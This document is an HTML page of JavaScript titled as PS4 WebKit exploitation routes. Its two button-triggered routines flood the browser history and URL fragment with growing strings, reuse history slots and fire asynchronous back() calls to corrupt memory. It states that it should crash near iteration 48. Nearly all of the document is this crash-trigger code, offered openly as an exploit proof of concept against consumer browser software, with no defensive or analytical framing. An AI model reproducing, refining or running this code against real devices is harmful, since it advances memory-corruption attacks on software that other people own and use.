<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Dual Exploitation Routes</title>

</head>

<body>
<h2>PS4 WebKit – History Exploitation Routes</h2>

<button onclick="runRoute1()">ROUTE 1 — SLOT REUSE (HistoryItem Collision)</button>
<button onclick="runRoute2()">ROUTE 2 — FRAGMENT BUFFER REPLACEMENT</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m,c=""){ 
  const s=document.createElement("span");
  if(c) s.className=c;
  s.textContent=m+"\n";
  logEl.appendChild(s);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const ITERS = 50;

// =====================================================
// ROUTE 1 — SLOT REUSE / COLLISION
// =====================================================
async function runRoute1(){
  logEl.textContent="";
  log("=== ROUTE 1: SLOT REUSE ===","crit");

  let size = BASE;
  let states = [];

  for(let i=0;i<ITERS;i++){
    const payload = "A".repeat(size);
    const state = { idx:i, data:payload };

    log(`[ITER ${i}] size=${size}`);
    history.pushState(state,"","#"+payload);
    history.replaceState(state,"","#"+payload);

    // force circular reuse
    if(i >= 32){
      log("  [reuse] overwriting circular slot","warn");
      history.pushState(
        { idx:i, reuse:true },
        "",
        "#R"+i+"_"+"B".repeat(1024)
      );
    }

    if(i % 6 === 0){
      setTimeout(()=>history.back(),0);
      log("  async back()","warn");
    }

    size += STEP;
    await sleep(3);
  }

  log(">>> END ROUTE 1 (should crash)","crit");
}

// =====================================================
// ROUTE 2 — FRAGMENT BUFFER REPLACEMENT
// =====================================================
async function runRoute2(){
  logEl.textContent="";
  log("=== ROUTE 2: FRAGMENT BUFFER REPLACEMENT ===","crit");

  let size = BASE;

  for(let i=0;i<ITERS;i++){
    let payload;

    // alternate large / small to recycle StringImpl
    if(i >= 46){
      payload = (i % 2 === 0)
        ? "X".repeat(32)
        : "Y".repeat(size);
      log(`[ITER ${i}] alternating fragment size=${payload.length}`,"warn");
    } else {
      payload = "A".repeat(size);
      log(`[ITER ${i}] size=${size}`);
    }

    history.pushState({i},"","#"+payload);
    history.replaceState({i},"","#"+payload);

    if(i === 47){
      log(">>> PRE-BACK BUFFER PRESSURE <<<","warn");
      for(let j=0;j<200;j++){
        location.hash = "#P"+j+"_"+"Z".repeat(64);
      }
    }

    if(i % 6 === 0){
      setTimeout(()=>history.back(),0);
      log("  async back()","warn");
    }

    size += STEP;
    await sleep(3);
  }

  log(">>> END ROUTE 2 (should crash)","crit");
}

log("Ready.");
log("Both routes preserve original crash conditions.");
log("Expected crash near ITER 48.");
</script>
</body>
</html>

